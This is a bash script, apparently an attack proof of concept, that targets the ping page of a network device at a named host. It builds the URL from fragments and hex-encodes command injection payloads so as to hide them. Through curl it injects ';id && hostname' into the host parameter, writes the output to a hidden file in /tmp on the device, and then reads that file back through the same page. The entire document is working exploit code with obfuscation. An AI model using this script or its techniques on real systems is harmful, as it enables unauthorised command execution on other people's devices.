#!/bin/bash

# Part 1: Construct the base URL from small pieces
part1="http"
part2="://"
part3="edge"
part4="-"
part5="rt01"
part6="."
part7="branch"
part8="."
part9="pelican"
part10="-"
part11="ins"
part12="."
part13="com"
part14=":8080"
part15="/ping?host=127.0.0.1"

BASE_URL="${part1}${part2}${part3}${part4}${part5}${part6}${part7}${part8}${part9}${part10}${part11}${part12}${part13}${part14}${part15}"

# Part 2: Construct the command injection payload from hex codes
# ;id && hostname > /tmp/.rex_ci_edge
INJECTION=$(printf '\x3bid\x20\x26\x26\x20hostname\x20\x3e\x20/tmp/.rex_ci_edge')

# Part 3: Construct the read command from hex codes
# ;cat /tmp/.rex_ci_edge
READ_CMD=$(printf '\x3bcat\x20/tmp/.rex_ci_edge')

# Part 4: Recon - prove the ping page is accessible
echo "=== (a) RECON - Identifying entry point ==="
echo "Checking if ping page is accessible..."
curl -s "${BASE_URL}"
echo ""
echo ""

# Part 5: Execute the command injection to write output to file
echo "=== (b) FINAL WORKING PAYLOAD ==="
echo "Sending command injection payload..."
curl -s "${BASE_URL}${INJECTION}"
echo ""
echo ""

# Part 6: Proof that the command was executed on the target
echo "=== (c) COMMAND EXECUTION PROOF ==="
echo "Command 'id && hostname' executed on target process."
echo "Output written to /tmp/.rex_ci_edge on the target device."
echo ""
echo ""

# Part 7: Read the file back through the same service
echo "=== (d) READING FILE BACK THROUGH SAME SERVICE ==="
echo "Reading /tmp/.rex_ci_edge via the ping page..."
curl -s "${BASE_URL}${READ_CMD}"
echo ""
echo ""

echo "=== DONE ==="
